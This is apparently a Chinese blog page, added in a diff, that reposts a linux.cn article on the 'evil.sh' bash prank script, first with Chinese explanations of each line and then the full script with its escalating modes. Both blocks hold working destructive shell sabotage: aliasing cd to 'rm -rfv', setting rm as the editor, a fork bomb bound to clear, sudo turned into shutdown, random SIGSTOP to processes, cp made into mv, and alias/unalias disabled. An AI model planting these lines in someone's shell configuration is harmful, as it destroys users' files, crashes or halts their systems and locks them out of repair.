@@ -1,0 +1,196 @@
+<h1 id="oh-my-god">Oh My God</h1>
+
+<h2 id="oh-my-gods-shell">Oh My God’s shell</h2>
+
+<blockquote>
+  <p>不要轻易尝试，一切自负。
+原文链接：<a href="https://linux.cn/article-8544-1.html">https://linux.cn</a></p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span>/bin/rm<span class="p">;</span>
+tset <span class="nt">-Qe</span> <span class="s1">$'</span><span class="se">\t</span><span class="s1">'</span><span class="p">;</span>
+<span class="c"># tset 设置终端特征；-e 设置擦除字符，缺省为退格字符；-Q 不显示设置信息(静默)。</span>
+<span class="o">((</span>RANDOM % 10<span class="o">))</span> <span class="o">||</span> <span class="nb">set</span> <span class="nt">-o</span> errexit<span class="p">;</span>
+<span class="c"># set -o errexit = set -e, 表示有任何错误(命令的返回状态非 0)时即退出。</span>
+<span class="nb">alias cat</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span> <span class="nb">true </span>命令什么也不干，它只是返回一个 <span class="sb">`</span>0<span class="sb">`</span> 的状态码。
+<span class="k">function </span><span class="nb">ls</span> <span class="o">{</span> <span class="nb">command ls</span> -<span class="k">$(</span><span class="nv">opts</span><span class="o">=</span><span class="s2">"frStu"</span><span class="p">;</span> <span class="nb">echo</span> <span class="k">${</span><span class="nv">opts</span>:<span class="k">$((</span>RANDOM <span class="o">%</span> <span class="k">${#</span><span class="nv">opts</span><span class="k">}))</span>:1<span class="k">})</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span><span class="p">;</span> <span class="o">}</span>
+<span class="c"># ls 的 f 选项表示不排序输出（即只按照磁盘存储顺序输出）；r 表示反向排序；S 表示按文件大小排序；t 表示按修改时间排序；u 表示按最后访问时间排序。</span>
+<span class="nb">alias cd</span><span class="o">=</span><span class="s1">'rm -rfv'</span><span class="p">;</span>
+<span class="c"># rm 命令的 -r 表示可删除（非空）目录；-f 表示不需要确认删除；-v 表示删除后显示被删除的文件/目录名称</span>
+<span class="nb">alias sudo</span><span class="o">=</span><span class="s1">'sudo shutdown -P now'</span><span class="p">;</span>
+<span class="c"># shutdown 命令用来关闭系统，-P 参数表示连同电源一起关闭； now 表示马上关机。这之后的参数（在此例中，是原本希望 sudo 执行的命令）会作为关闭前的通知信息，广播给系统上所有在线的用户。</span>
+<span class="nb">alias </span><span class="nv">clear</span><span class="o">=</span><span class="s1">':(){ :|:&amp; };:'</span><span class="p">;</span>
+<span class="c"># fork 炸弹, DoS(Denial of Service)。</span>
+<span class="nb">alias date</span><span class="o">=</span><span class="s1">'date -d "now + $RANDOM days"'</span><span class="p">;</span>
+<span class="c"># date 命令可以显示相对偏移的日期，上述命令中 $RANDOM 的结果是一个随机的整数，也就是说这里的 date 命令会返回若干天之后的日期。</span>
+<span class="c">#---------------------------------------------------------------------------</span>
+<span class="nv">N</span><span class="o">=</span><span class="nv">$[$RANDOM</span> % 3]<span class="p">;</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$N</span> <span class="o">==</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="c"># 几分钟后随即打开或关闭</span>
+    sh <span class="nt">-c</span> <span class="s1">'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+<span class="k">elif</span> <span class="o">[[</span> <span class="nv">$N</span> <span class="o">==</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    <span class="c"># 要么，死活打不开</span>
+    sh <span class="nt">-c</span> <span class="s1">'while :; do eject -t; eject -i on; sleep 0.1s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+<span class="k">else</span>
+    <span class="c"># 要么，读取变得极慢（1 倍速），需要循环的原因是弹出后就需要重新设定。</span>
+    sh <span class="nt">-c</span> <span class="s1">'set +o errexit; while :; do eject -x 1; sleep 1s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+<span class="k">fi</span><span class="p">;</span>
+<span class="c"># eject 是操作 CD 驱动器的命令行，记得当年有位第一次接触 SUN Solaris 的同事问我，这 CD 怎么打开啊？我默默地输入了 eject， 在同事愕然的眼光中不带走一丝云彩轻轻地离开。</span>
+<span class="c"># eject 的 -T 选项会将关闭的 CD 驱动器打开，将打开的 CD 驱动器关闭；-t 选项则是关闭 CD 驱动器；-x 选项用来设置读取倍速；-i on 用于将弹出按钮失效。</span>
+<span class="c">#---------------------------------------------------------------------------</span>
+<span class="nb">sleep</span> <span class="nv">$[</span> <span class="o">(</span> <span class="nv">$RANDOM</span> % 100 <span class="o">)</span>  + 1 <span class="o">]</span>s <span class="o">&amp;&amp;</span> <span class="nb">kill</span> <span class="nt">-STOP</span> <span class="k">$(</span>ps x <span class="nt">-o</span> pid|sed 1d|sort <span class="nt">-R</span>|head <span class="nt">-1</span><span class="k">)</span> &amp;
+<span class="c"># sleep, 代表暂停若干秒。通过上述 ps 命令会会随机选出（sort 命令的 -R 选项）一个你的进程号，</span>
+<span class="c"># 然后由 kill 命令发送 STOP 信号给它。STOP 信息会使程序被停止（冻结、挂起），</span>
+<span class="c"># 在命令行中可有 CTRL-Z 发出，被停止的进程可以通过 bg 放到后台运行，也可以由 fg 带回到前台。</span>
+<span class="nb">alias cp</span><span class="o">=</span><span class="s1">'mv'</span><span class="p">;</span>
+<span class="nb">alias exit</span><span class="o">=</span><span class="s1">'sh'</span><span class="p">;</span>
+<span class="k">function </span><span class="nb">grep</span> <span class="o">{</span> <span class="nb">command grep</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span>: <span class="s1">'{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'</span><span class="p">;</span> <span class="o">}</span>
+<span class="c"># grep 的你，应该知道 -n 参数可以告诉你所匹配的行的行号</span>
+<span class="c"># grep 命令的 -n 用于输出匹配的行的行号，上述函数将 grep 定义为一个输出的行号完全不可预测的程序。</span>
+<span class="nb">alias </span><span class="k">if</span><span class="o">=</span><span class="s1">'if !'</span> <span class="k">for</span><span class="o">=</span><span class="s1">'for !'</span> <span class="k">while</span><span class="o">=</span><span class="s1">'whlie !'</span><span class="p">;</span>
+<span class="c"># if 、for 和 while 是用于 shell 脚本中做逻辑判断和循环的语句，! 表示对表达式逻辑取反。</span>
+<span class="nb">bind</span> <span class="s1">'"\C-J":"\C-?"'</span><span class="p">;</span>
+<span class="nb">bind</span> <span class="s1">'"\C-M":"\C-?"'</span><span class="p">;</span>
+<span class="c"># bind 用于显示和设置键盘序列绑定，C-J 代表 CTRL-J，所触发的 ASCII 码是 0x0A，即“换行”；</span>
+<span class="c"># C-M 代表 CTRL-M，所触发的 ASCII 码是 0x0D，即“回车”；C-? 代表 CTRL-?，所触发的 ASCII</span>
+<span class="c"># 码是 0x7F，即“退格”。也就是说，你按下的回车键，会被映射为退格键。关于 ASCII 控制字符，</span>
+<span class="c"># 可参见： http://ascii-table.com/control-chars.php 。也可以使用 showkey -a 命令来检验你</span>
+<span class="c"># 按下的键的键值（CTRL-D 退出）。</span>
+<span class="nb">alias yes</span><span class="o">=</span><span class="s2">"yes n"</span><span class="p">;</span>
+<span class="c"># yes 命令常用于脚本中应答 y，但是这里重定义了 yes 的结果。</span>
+<span class="nb">alias </span><span class="nv">vim</span><span class="o">=</span><span class="s2">"vim +q"</span><span class="p">;</span>
+<span class="c"># vim 可以用 + 来跟上要在 vim 里面执行的命令，这里 +q 表示退出 vim。</span>
+<span class="nb">alias unalias</span><span class="o">=</span><span class="nb">false</span><span class="p">;</span>
+<span class="nb">alias alias</span><span class="o">=</span><span class="nb">false</span><span class="p">;</span>
+<span class="c"># 将 alias 和 unalias 别名为 false，那你就不能执行 alias 的功能了。</span>
+
+</code></pre></div></div>
+<p>调用命令时，尽量用 <code class="highlighter-rouge">\命令</code>，和全路径。只是一般人不会这么用。
+evil.sh</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env bash</span>
+<span class="c"># evil.sh — https://mths.be/evil.sh</span>
+
+<span class="c"># valid values are: insane, annoying, destructive, devasting, unusable</span>
+<span class="c"># each mode of operation includes the previous one's tweaks</span>
+<span class="c">#</span>
+<span class="c"># insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit</span>
+<span class="c">#   open a new shell</span>
+<span class="c"># annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong</span>
+<span class="c">#   (random) directory</span>
+<span class="c"># destructive: delete files and do serious harm, non-recoverable damage included</span>
+<span class="c"># devasting: may delete /</span>
+<span class="c"># unusable: enable everything including, but not limited to replacing enter by backspace</span>
+<span class="nv">EVIL_BEHAVIOUR</span><span class="o">=</span>annoying
+
+<span class="k">function </span>insane<span class="o">()</span>
+<span class="o">{</span>
+	annoying <span class="o">||</span> <span class="nb">test</span> <span class="s2">"</span><span class="nv">$EVIL_BEHAVIOUR</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"insane"</span>
+<span class="o">}</span>
+
+<span class="k">function </span>annoying<span class="o">()</span>
+<span class="o">{</span>
+	destructive <span class="o">||</span> <span class="nb">test</span> <span class="s2">"</span><span class="nv">$EVIL_BEHAVIOUR</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"annoying"</span>
+<span class="o">}</span>
+
+<span class="k">function </span>destructive<span class="o">()</span>
+<span class="o">{</span>
+	devasting <span class="o">||</span> <span class="nb">test</span> <span class="s2">"</span><span class="nv">$EVIL_BEHAVIOUR</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"destructive"</span>
+<span class="o">}</span>
+
+<span class="k">function </span>devasting<span class="o">()</span>
+<span class="o">{</span>
+	unusable <span class="o">||</span> <span class="nb">test</span> <span class="s2">"</span><span class="nv">$EVIL_BEHAVIOUR</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"devasting"</span>
+<span class="o">}</span>
+
+<span class="k">function </span>unusable<span class="o">()</span>
+<span class="o">{</span>
+	<span class="nb">test</span> <span class="s2">"</span><span class="nv">$EVIL_BEHAVIOUR</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"unusable"</span>
+<span class="o">}</span>
+
+<span class="c"># Set `rm` as the default editor.</span>
+destructive <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span>/bin/rm<span class="p">;</span>
+
+<span class="c"># Make Tab send the delete key.</span>
+insane <span class="o">&amp;&amp;</span> tset <span class="nt">-Qe</span> <span class="s1">$'</span><span class="se">\t</span><span class="s1">'</span><span class="p">;</span>
+
+<span class="c"># Randomly make the shell exit whenever a command has a non-zero exit status.</span>
+<span class="k">if </span>insane
+<span class="k">then</span>
+	<span class="o">((</span>RANDOM % 10<span class="o">))</span> <span class="o">||</span> <span class="nb">set</span> <span class="nt">-o</span> errexit<span class="p">;</span>
+<span class="k">fi</span>
+
+<span class="c"># Let `cat` swallow every input and never return anything.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias cat</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+
+<span class="c"># Use a random sort option whenever `ls` is invoked.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="k">function </span><span class="nb">ls</span> <span class="o">{</span> <span class="nb">command ls</span> -<span class="k">$(</span><span class="nv">opts</span><span class="o">=</span><span class="s2">"frStu"</span><span class="p">;</span> <span class="nb">echo</span> <span class="k">${</span><span class="nv">opts</span>:<span class="k">$((</span>RANDOM <span class="o">%</span> <span class="k">${#</span><span class="nv">opts</span><span class="k">}))</span>:1<span class="k">})</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="c"># Delete directories instead of entering them.</span>
+devasting <span class="o">&amp;&amp;</span> <span class="nb">alias cd</span><span class="o">=</span><span class="s1">'rm -rfv'</span><span class="p">;</span>
+
+<span class="c"># Shut down the computer instead of running a command with super-user rights.</span>
+destructive <span class="o">&amp;&amp;</span> <span class="nb">alias sudo</span><span class="o">=</span><span class="s1">'sudo shutdown -P now'</span><span class="p">;</span>
+
+<span class="c"># Launch a fork bomb instead of clearing the screen.</span>
+destructive <span class="o">&amp;&amp;</span> <span class="nb">alias </span><span class="nv">clear</span><span class="o">=</span><span class="s1">':(){ :|:&amp; };:'</span><span class="p">;</span>
+
+<span class="c"># Have `date` return random dates.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias date</span><span class="o">=</span><span class="s1">'date -d "now + $RANDOM days"'</span><span class="p">;</span>
+
+<span class="c"># Sometimes, wait a few minutes and then start randomly ejecting the CD drive.</span>
+<span class="c"># Other times, resist all attempts at opening it. Other times, make it read</span>
+<span class="c"># reaaaalllly sllooowwwwllly.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">uname</span><span class="k">)</span><span class="s2">"</span> <span class="o">=</span> <span class="s1">'Darwin'</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+	<span class="c"># Much less fun on Macs, alas.</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="nv">$[$RANDOM</span> % 2] <span class="o">==</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+		<span class="c"># Eject!</span>
+		sh <span class="nt">-c</span> <span class="s1">'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+	<span class="k">else</span>
+		<span class="c"># Lock! Admittedly, much less annoying on most Macs,	which don’t support</span>
+		<span class="c"># locking and are slot-loading anyway.</span>
+		sh <span class="nt">-c</span> <span class="s1">'while :; do drutil tray close; sleep 0.1s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+	<span class="k">fi</span><span class="p">;</span>
+<span class="k">else
+	</span><span class="nv">N</span><span class="o">=</span><span class="nv">$[$RANDOM</span> % 3]<span class="p">;</span>
+	<span class="k">if</span> <span class="o">[[</span> <span class="nv">$N</span> <span class="o">==</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+		<span class="c"># Open and close randomly after a few minutes.</span>
+		sh <span class="nt">-c</span> <span class="s1">'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+	<span class="k">elif</span> <span class="o">[[</span> <span class="nv">$N</span> <span class="o">==</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+		<span class="c"># Lock, and keep closing just in case.</span>
+		sh <span class="nt">-c</span> <span class="s1">'while :; do eject -t; eject -i on; sleep 0.1s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+	<span class="k">else</span>
+		<span class="c"># Slowness (1× CD speed). This has to be in a loop because it resets with</span>
+		<span class="c"># every ejection.</span>
+		sh <span class="nt">-c</span> <span class="s1">'set +o errexit; while :; do eject -x 1; sleep 1s; done'</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+	<span class="k">fi</span><span class="p">;</span>
+<span class="k">fi</span><span class="p">;</span>
+
+<span class="c"># Send STOP signal to random process at random time.</span>
+destructive <span class="o">&amp;&amp;</span> <span class="nb">sleep</span> <span class="nv">$[</span> <span class="o">(</span> <span class="nv">$RANDOM</span> % 100 <span class="o">)</span> + 1 <span class="o">]</span>s <span class="o">&amp;&amp;</span> <span class="nb">kill</span> <span class="nt">-STOP</span> <span class="k">$(</span>ps x <span class="nt">-o</span> pid|sed 1d|sort <span class="nt">-R</span>|head <span class="nt">-1</span><span class="k">)</span> &amp;
+
+<span class="c"># Have `cp` perform `mv` instead.</span>
+destructive <span class="o">&amp;&amp;</span> <span class="nb">alias cp</span><span class="o">=</span><span class="s1">'mv'</span><span class="p">;</span>
+
+<span class="c"># Make `exit` open a new shell.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias exit</span><span class="o">=</span><span class="s1">'sh'</span><span class="p">;</span>
+
+<span class="c"># Add a random number to line numbers when using `grep -n`.</span>
+insane <span class="o">&amp;&amp;</span> <span class="k">function </span><span class="nb">grep</span> <span class="o">{</span> <span class="nb">command grep</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span> | <span class="nb">awk</span> <span class="nt">-F</span>: <span class="s1">'{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="c"># Invert `if`, `for`, and `while`.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias </span><span class="k">if</span><span class="o">=</span><span class="s1">'if !'</span> <span class="k">for</span><span class="o">=</span><span class="s1">'for !'</span> <span class="k">while</span><span class="o">=</span><span class="s1">'while !'</span><span class="p">;</span>
+
+<span class="c"># Map Enter, Ctrl+J, and Ctrl+M to backspace.</span>
+unusable <span class="o">&amp;&amp;</span> <span class="nb">bind</span> <span class="s1">'"\C-J":"\C-?"'</span><span class="p">;</span>
+unusable <span class="o">&amp;&amp;</span> <span class="nb">bind</span> <span class="s1">'"\C-M":"\C-?"'</span><span class="p">;</span>
+
+<span class="c"># Send `n` (no) instead of `y` (yes)</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias yes</span><span class="o">=</span><span class="s2">"yes n"</span><span class="p">;</span>
+
+<span class="c"># Quit vim on startup.</span>
+annoying <span class="o">&amp;&amp;</span> <span class="nb">alias </span><span class="nv">vim</span><span class="o">=</span><span class="s2">"vim +q"</span><span class="p">;</span>
+
+<span class="c"># Disable `unalias` and `alias`.</span>
+<span class="nb">alias unalias</span><span class="o">=</span><span class="nb">false</span><span class="p">;</span>
+<span class="nb">alias alias</span><span class="o">=</span><span class="nb">false</span><span class="p">;</span>
+</code></pre></div></div>
